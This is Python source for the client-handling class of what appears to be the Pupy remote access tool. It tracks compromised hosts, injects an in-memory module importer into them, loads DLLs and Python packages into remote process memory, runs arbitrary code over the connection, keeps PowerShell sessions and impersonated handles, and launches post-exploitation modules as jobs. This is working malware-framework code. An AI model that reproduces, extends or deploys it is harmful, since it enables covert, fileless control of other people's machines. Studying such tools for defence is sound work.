# -*- coding: utf-8 -*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------
import sys, os, os.path
import textwrap
import logging
import cPickle
from .PupyErrors import PupyModuleError
import traceback
import textwrap
from .PupyPackagesDependencies import packages_dependencies, LOAD_PACKAGE, LOAD_DLL, EXEC, ALL_OS, WINDOWS, LINUX, ANDROID
from .PupyJob import PupyJob

ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))

class PupyClient(object):
    def __init__(self, desc, pupsrv):
        self.desc=desc
        self.powershell={'x64': {'object': None, 'scripts_loaded': []}, 'x86': {'object': None, 'scripts_loaded': []}}
        #alias
        self.conn=self.desc["conn"]
        self.pupsrv=pupsrv
        self.load_pupyimporter()
        self.imported_dlls={}

        #to reuse impersonated handle in other modules
        self.impersonated_dupHandle=None

    def __str__(self):
        return "PupyClient(id=%s, user=%s, hostname=%s, platform=%s)"%(self.desc["id"], self.desc["user"], self.desc["hostname"], self.desc["platform"])

    def __del__(self):
        del self.desc
        # close the powershell interpreter
        for arch in ['x64', 'x86']:
            if self.powershell[arch]['object']:
                self.powershell[arch]['object'].stdin.write("exit\n")
        del self.powershell

    def get_conf(self):
        dic={}
        if "offline_script" in self.desc:
            dic["offline_script"]=self.desc["offline_script"]
        dic["launcher"]=self.desc["launcher"]
        dic["launcher_args"]=self.desc["launcher_args"]
        return dic

    def short_name(self):
        try:
            return self.desc["platform"][0:3].lower()+"_"+self.desc["hostname"]+"_"+self.desc["macaddr"].replace(':','')
        except Exception:
            return "unknown"

    def is_unix(self):
        return not self.is_windows()

    def is_linux(self):
        return "linux" in self.desc["platform"].lower()

    def is_android(self):
        return self.desc["platform"].lower()=="android"

    def is_windows(self):
        if "windows" in self.desc["platform"].lower():
            return True
        return False

    def is_darwin(self):
        if "darwin" in self.desc["platform"].lower():
            return True
        return False

    @property
    def platform(self):
        if self.is_android():
            return 'android'
        elif self.is_windows():
            return 'windows'
        elif self.is_linux():
            return 'linux'
        elif self.is_darwin():
            return 'darwin'
        elif self.is_unix():
            return 'unix'

    @property
    def os_arch(self):
        arch = self.desc['os_arch'].lower()
        substitute = {
            'x86_64': 'amd64',
            'i386': 'x86',
            'i686': 'x86',
            'i486': 'x86',
        }
        return substitute.get(arch) or arch

    @property
    def arch(self):
        os_arch_to_platform = {
            'amd64': 'intel',
            'x86': 'intel'
        }

        os_platform_to_arch = {
            'intel': {
                '32bit': 'x86',
                '64bit': 'amd64'
            }
        }

        if self.os_arch in os_arch_to_platform:
            return os_platform_to_arch[
                os_arch_to_platform[self.os_arch]
            ][self.desc['proc_arch']]
        else:
            return None

    def is_proc_arch_64_bits(self):
        if "64" in self.desc["proc_arch"]:
            return True
        return False

    def get_packages_path(self):
        """ return the list of path to search packages for depending on client OS and architecture """
        path = [
            os.path.join('packages', self.platform),
            os.path.join('packages', self.platform, 'all'),
        ]

        if self.arch:
            path = path + [
                os.path.join(p, self.arch) for p in path
            ]

        path.append(os.path.join('packages', 'all'))

        path = path + [
            os.path.join(ROOT, p) for p in path
        ]

        return set(path)

    def load_pupyimporter(self):
        """ load pupyimporter in case it is not """
        if "pupyimporter" not in self.conn.modules.sys.modules:
            pupyimporter_code=""
            with open(os.path.join(ROOT, "packages","all","pupyimporter.py"),'rb') as f:
                pupyimporter_code=f.read()
            self.conn.execute(textwrap.dedent(
            """
            import imp
            import sys
            def pupyimporter_preimporter(code):
                mod = imp.new_module("pupyimporter")
                mod.__name__="pupyimporter"
                mod.__file__="<memimport>\\\\pupyimporter"
                mod.__package__="pupyimporter"
                sys.modules["pupyimporter"]=mod
                exec code+"\\n" in mod.__dict__
                mod.install()
                """))
            self.conn.namespace["pupyimporter_preimporter"](pupyimporter_code)

    def load_dll(self, path):
        """
            load some dll from memory like sqlite3.dll needed for some .pyd to work
            Don't load pywintypes27.dll and pythoncom27.dll with this. Use load_package("pythoncom") instead
        """
        name=os.path.basename(path)
        if name in self.imported_dlls:
            return False
        buf=b""

        if not os.path.exists(path):
            path = None
            for packages_path in self.get_packages_path():
                packages_path = os.path.join(packages_path, name)
                if os.path.exists(packages_path):
                        path = packages_path

        if not path:
            raise ImportError("load_dll: couldn't find {}".format(name))

        with open(path,'rb') as f:
            buf=f.read()
        if not self.conn.modules.pupy.load_dll(name, buf):
            raise ImportError("load_dll: couldn't load {}".format(name))

        self.imported_dlls[name]=True
        return True

    def load_package(self, module_name, force=False):
        if module_name in packages_dependencies:
            for t,o,v in packages_dependencies[module_name]:
                if o==ALL_OS or (o==ANDROID and self.is_android()) or (o==WINDOWS and self.is_windows()) or (o==LINUX and self.is_linux()):
                    if t==LOAD_PACKAGE:
                        self._load_package(v, force)
                    elif t==LOAD_DLL:
                        self.load_dll(v)
                    elif t==EXEC:
                        self.conn.execute(v)
                    else:
                        raise PupyModuleError("Unknown package loading method %s"%t)
        return self._load_package(module_name, force)

    def _get_module_dic(self, search_path, start_path, pure_python_only=False):
        modules_dic={}
        if os.path.isdir(os.path.join(search_path,start_path)): # loading a real package with multiple files
            for root, dirs, files in os.walk(os.path.join(search_path,start_path), followlinks=True):
                for f in files:
                    if pure_python_only:
                        if f.endswith((".so",".pyd",".dll")): #avoid loosing shells when looking for packages in sys.path and unfortunatelly pushing a .so ELF on a remote windows
                            continue
                    module_code=""
                    with open(os.path.join(root,f),'rb') as fd:
                        module_code=fd.read()
                    modprefix = root[len(search_path.rstrip(os.sep))+1:]
                    modpath = os.path.join(modprefix,f).replace("\\","/")
                    modules_dic[modpath]=module_code
                package_found=True
        else: # loading a simple file
            extlist=[ ".py", ".pyc", ".pyo" ]
            if not pure_python_only:
                extlist+=[ ".so", ".pyd", "27.dll" ] #quick and dirty ;) => pythoncom27.dll, pywintypes27.dll
            for ext in extlist:
                filepath=os.path.join(search_path,start_path+ext)
                if os.path.isfile(filepath):
                    module_code=""
                    with open(filepath,'rb') as f:
                        module_code=f.read()
                    cur=""
                    for rep in start_path.split("/")[:-1]:
                        if not cur+rep+"/__init__.py" in modules_dic:
                            modules_dic[rep+"/__init__.py"]=""
                        cur+=rep+"/"

                    modules_dic[start_path+ext]=module_code
                    package_found=True
                    break
        return modules_dic

    def _load_package(self, module_name, force=False):
        """
            load a python module into memory depending on what OS the client is.
            This function can load all types of modules in memory for windows both x86 and amd64 including .pyd C extensions
            For other platforms : loading .so in memory is not supported yet.
        """
        # start path should only use "/" as separator
        start_path=module_name.replace(".", "/")
        package_found=False
        package_path=None
        for search_path in self.get_packages_path():
            try:
                modules_dic=self._get_module_dic(search_path, start_path)
                if modules_dic:
                    package_path=search_path
                    break
            except Exception as e:
                raise PupyModuleError("Error while loading package %s : %s"%(module_name, traceback.format_exc()))
        if not modules_dic: # in last resort, attempt to load the package from the server's sys.path if it exists
            for search_path in sys.path:
                try:
                    modules_dic=self._get_module_dic(search_path, start_path, pure_python_only=True)
                    if modules_dic:
                        logging.info("package %s not found in packages/, but found in local sys.path, attempting to push it remotely..."%module_name)
                        package_path=search_path
                        break
                except Exception as e:
                    raise PupyModuleError("Error while loading package from sys.path %s : %s"%(module_name, traceback.format_exc()))
        if "pupyimporter" not in self.conn.modules.sys.modules:
            raise PupyModuleError("pupyimporter module does not exists on the remote side !")
        if not modules_dic:
            raise PupyModuleError("Couldn't load package %s : no such file or directory neither in \(path=%s) or sys.path"%(module_name,repr(self.get_packages_path())))
        if force or ( module_name not in self.conn.modules.sys.modules ):
            self.conn.modules.pupyimporter.pupy_add_package(cPickle.dumps(modules_dic)) # we have to pickle the dic for two reasons : because the remote side is not aut0horized to iterate/access to the dictionary declared on this side and because it is more efficient
            logging.debug("package %s loaded on %s from path=%s"%(module_name, self.short_name(), package_path))
            if force and  module_name in self.conn.modules.sys.modules:
                self.conn.modules.sys.modules.pop(module_name)
                logging.debug("package removed from sys.modules to force reloading")
            return True
        return False

    def run_module(self, module_name, args):
        """ start a module on this unique client and return the corresponding job """
        module_name=self.pupsrv.get_module_name_from_category(module_name)
        mod=self.pupsrv.get_module(module_name)
        if not mod:
            raise Exception("unknown module %s !"%modargs.module)
        pj=None
        modjobs=[x for x in self.pupsrv.jobs.itervalues() if x.pupymodules[0].get_name() == mod.get_name() and x.pupymodules[0].client==self]
        if mod.daemon and mod.unique_instance and modjobs:
            pj=modjobs[0]
        else:
            pj=PupyJob(self.pupsrv,"%s %s"%(module_name, args))
            ps=mod(self, pj)
            pj.add_module(ps)
            self.pupsrv.add_job(pj)
        pj.start(args)
        return pj
